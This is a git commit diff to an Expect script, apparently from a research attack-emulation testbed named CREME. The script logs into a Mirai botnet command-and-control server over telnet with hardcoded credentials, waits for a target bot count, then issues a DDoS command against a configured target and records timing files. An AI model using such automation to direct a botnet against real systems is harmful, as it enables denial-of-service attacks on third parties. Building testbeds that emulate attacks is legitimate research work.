635c23d34f8e26d88383b4b0c77885e1b56b8a86
masjohncook <mas.john.cook@gmail.com>
2022-11-08 15:20:28 +0800

    fix - edit timeout

--- CREME_backend_execution/scripts/02_scenario/01_mirai/python_files/cnc/login.sh
+++ CREME_backend_execution/scripts/02_scenario/01_mirai/python_files/cnc/login.sh
@@ -6,13 +6,11 @@ set dur [lindex $argv 3]
 set path [lindex $argv 4]
 set cnc_ip [lindex $argv 5]
 
-
 set ddosFinishedFile "ddosFinishedFile.txt"
 set transferFinishedFile "TransferFinishedFile.txt"
 set outputTime "time_step_4_start_DDoS.txt"
+set timeout 10
 set flag 0
-
-set timeout 900
 
 set outputDDoSFile [open $path/$ddosFinishedFile "w+"]
 puts $outputDDoSFile "False"
@@ -22,7 +20,6 @@ set outputTransferFile [open $path/$transferFinishedFile "w+"]
 puts $outputTransferFile "False"
 close $outputTransferFile
 
-set timeout 300
 # Connect to CNC Server
 spawn telnet $cnc_ip 23
 send "\r"
@@ -37,31 +34,24 @@ send "mirai-pass\r"
 expect "mirai-user@botnet#"
 send "botcount\r"
 
-# shellcheck disable=SC1073
-while { $flag < 1 }
-{
+while { $flag < 1 } {
+    # puts $flag
+    expect ":	$numOfBots" {
+        set outputTransferFile [open $path/$transferFinishedFile "w+"]
+        puts $outputTransferFile "True"
+        close $outputTransferFile
 
-# puts $flag
-# expect ":	$numOfBots"
-      set outputTransferFile [open $path/$transferFinishedFile "w+"]
-      puts $outputTransferFile "True"
-      close $outputTransferFile
+        # Record time finish transfer and start to DDoS
+        set DATE [exec date +%s]
+        set outputTimeFile [open $path/$outputTime "w+"]
+        puts $outputTimeFile $DATE
+        close $outputTimeFile
 
-#      set DATE [exec date +%s]
-#      set outputTimeFile [open $path/$outputTime "w+"]
-#      puts $outputTimeFile $DATE
-#      close $outputTimeFile
-# Record time finish transfer and start to DDoS
-      send "$DDoSType $targetedDDoS $dur\r"
-      incr flag
-
-      send "botcount\r"
+        send "$DDoSType $targetedDDoS $dur\r"
+	    incr flag
+    }
+    send "botcount\r"
 }
-
-set DATE [exec date +%s]
-set outputTimeFile [open $path/$outputTime "w+"]
-puts $outputTimeFile $DATE
-close $outputTimeFile
 
 # wait to fully finish DDoS
 set sleep_time [expr $dur + 30]
